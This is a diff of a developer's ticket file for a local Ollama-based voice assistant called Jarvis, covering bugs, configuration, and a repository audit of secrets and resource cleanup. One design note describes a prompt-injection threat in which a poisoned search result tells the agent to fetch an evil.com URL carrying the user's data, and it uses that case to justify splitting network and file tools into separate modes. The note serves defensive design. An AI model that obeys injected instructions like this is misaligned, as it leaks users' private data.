@@ -10,11 +10,9 @@
 - **Subtasks or related tasks**: Related or depended or dependent tasks, by name or description
 - **Definition of done**: What must be true to close this
 
-**Working order: Tickets are (usually) listed in the order I intend to work them**
+***After each ticket is completed, move it to the DONE section in this file under the appropriate version, update the ticket's contents as needed, and update the README only if absolutely necessary.***
 
----
-
-## 0. Investigate - Just make sure that any resources initialized at ANY point in the code is cleaned up (artifacts on disk relating to tts, stt, conversations with the ollama agent, etc). And make sure something in the CLAUDE.md exists in the coding rules to ensure it stays this way in the future.
+**Tickets are (usually) listed in the order I intend to work them.**
 
 ---
 
@@ -78,14 +76,11 @@
 
 - **How to reproduce**: You said: "Access the Internet to find today's date." Jarvis: Today's date is October 27, 2023. Let me know if you need anything else!
 - **Diagnosis note**: the date itself is a training-cutoff artifact, not the
-  model believing it has a network tool. Two separate fixes: the official `time`
-  MCP server handles "what's today," and a system prompt stating what tools
+  model believing it has a network tool. A system prompt stating what tools
   exist handles the broader problem below.
 - **Ideas**: This leads to the larger problem of the agent literally having no context of its abilities or how it's being used. Should I create an instructions file for each "Jarvis mode" I create so it has context?
 - **Related task**: Investigate having an instructions file per Jarvis mode that tells the agent its exact role and abilities, make some configurable fields hidden
-- **Definition of done**: asking for today's date returns today's date; asking
-  for something requiring a tool it doesn't have gets a refusal, not an
-  invention.
+- **Definition of done**: Asking for something requiring a tool it doesn't have gets a refusal.
 
 ---
 
@@ -97,20 +92,13 @@
 
 ---
 
-## 6. Task - Make some configurable fields hidden
+## 6. QOL - Make some configurable fields hidden
 
-- **User story**: I want some of the configurable to come from environment variables or a .env file, hidden from Claude Code (my coding assistant) and hidden from being pushed to GitHub too. I still want default values on these fields in case I don't provide any of them. The configurations I want hidden are the system prompt and the wake word model (once I'm able to make my own wake word models).
+- **I the dev**: I the developer of this software want some of the configurable fields to come from environment variables or a .env file, hidden from Claude Code (my coding assistant) and hidden from being pushed to GitHub too. I still want default values on these fields in case I don't provide any of them. The configurations I want hidden are the system prompt and the wake word model (once I'm able to make my own wake word models).
 - **Implementation ideas**: Create a .env file that I can put the fields I want into (SYSTEM_PROMPT and WAKE_WORD_MODEL) but keep defaults in case grabbing them returns null or empty.
-- **Correction**: `.claudeignore` does not exist — Claude Code does not read it,
-  with no warning. The documented mechanism is `permissions.deny` in
-  `.claude/settings.json` (e.g. `"Read(**/.env)"`), which has a long tail of
-  open issues about inconsistent enforcement. Decide whether "hidden from my
-  coding assistant" is actually a goal — it makes ticket 4 harder to debug,
-  since that's a system-prompt bug. "Not pushed to GitHub" is fully solved by
-  `.gitignore` alone.
+- **Correction**: `.claudeignore` does not exist — Claude Code does not read it, with no warning. The documented mechanism is `permissions.deny` in `.claude/settings.json` (e.g. `"Read(**/.env)"`), which has a long tail of open issues about inconsistent enforcement. Decide whether "hidden from my coding assistant" is actually a goal — it makes ticket 4 harder to debug, since that's a system-prompt bug. "Not pushed to GitHub" is fully solved by `.gitignore` alone.
 - **Subtasks**: Investigate having an instructions file per Jarvis mode that tells the agent its exact role and abilities
-- **Definition of done**: `.env` is gitignored; every hidden field has a working
-  default when unset; a test covers the unset path.
+- **Definition of done**: `.env` is gitignored; every hidden field has a working default when unset; a test covers the unset path.
 
 ---
 
@@ -232,7 +220,11 @@
 - **Subtasks or related tasks**: Related or depended or dependent tasks, by name or description
 - **etc.** (any other necessary info)
 
+**Tickets are (usually) listed in the order I intend to work them**
+
 ---
+
+## v1.0
 
 **Bugfix - Setting config.INPUT_DEVICE_NAME to ATR4697 / ATR4697-USB / Ryzen threw "Invalid sample rate", but default and pipewire worked**
 - **Bug Cause**: A sample-rate problem, not a wrong-device problem. Jarvis records at SAMPLE_RATE = 16000. "ATR4697" matches the raw ALSA entry `hw:0,0`, and the mic hardware only runs at 44100/48000 with no conversion layer behind a `hw:` device. "Ryzen" matches a JACK device, and the PipeWire graph is pinned to 48000. Only "default"/"pipewire" go through PipeWire, which resamples.
@@ -288,3 +280,18 @@
 - **Validation**: Is there a way to validate that the local model has reached and used an mcp tool successfully? Or maybe ask the agent to use the tool and come back with a one word answer and assert verification on that. Is there a way to validate that the agent CANNOT write to the internet and is truly sandboxed from communicating outside its boundaries?
 - **Subtasks**: Investigate what a local Ollama agent can already do, investigate mcp client for ollama and ollama mcp bridge repos to figure out what they do, investigate existing mcp tools and servers
 - **Decision (from the investigations below)**: Read-only is NOT a safety boundary. Filesystem access + web search + URL fetch is the "lethal trifecta" — a poisoned search result can instruct the agent to fetch evil.com/log?d=<your data>, which is a GET and therefore "read-only" while still exfiltrating. Jarvis will have multiple modes instead, selected by a voice command at the start of the program: a web mode with no filesystem tools, and a files mode with no network tools, and maybe others down the road.
+
+---
+
+## v2.0
+
+**Audit - No sensitive data in the repo (now or future); every resource init in jarvis/ and tests/ traced to its release**
+- **Sensitive data findings**: Full git history grepped for key/token/password/private-key patterns — clean; every hit was "token" in the LLM sense. One leak found: the README's example startup output contained the Bluetooth speaker's real MAC address (`bluez_output.E4_58...`). Redacted in the README; note it still exists in the pushed git history (commit ec0f409) — rewriting history for a BT MAC was judged not worth it, revisit if the repo audience widens.
+- **Future-proofing**: Added a "No secrets in the repo, ever" rule to CLAUDE.md (secrets go in a gitignored `.env` with safe defaults in config.py — pre-wires ticket "Make some configurable fields hidden"). Added `.env` and `.claude/settings.local.json` to `.gitignore` (the latter was untracked and unignored — accidental-commit risk).
+- **Resource trace, jarvis/**: all clean. `OllamaLLM` is a context manager; a spawned `ollama serve` is terminated (escalating to kill) even when the startup readiness loop or the GPU check raises, and a pre-existing server is left alone. Mic `InputStream` closed by `with`; the `sd.play` speaker stream closed by `try/finally sd.stop()`. `pactl` runs via `subprocess.run` (no lingering child). STT/TTS/wake-word/VAD models are in-memory only — no runtime artifacts on disk, and conversation history lives only in `OllamaLLM._messages` (the Ollama HTTP API is stateless; nothing persisted server-side, server output goes to DEVNULL).
+- **Resource trace, tests/**: all clean. Fakes for Ollama client/process/VAD/device table; real models held in module-scoped fixtures released at module teardown; wave file written via `with`; every manual check wraps playback/recording in `try/finally sd.stop()` and the wakeword stream in `with`.
+- **Known deliberate leftovers (documented, not bugs)**: `manual_audio_check.py loopback` saves the mic recording to `/tmp/jarvis_mic_check.wav` for inspection — documented in the file header, tmpfs clears it on reboot. `build.sh` artifacts (`.venv/`, `models/`, `~/.cache/huggingface`) are durable installs, all gitignored or outside the repo.
+- **Validation**: docs/config-only changes; fast pytest suite still passes.
+
+---
+
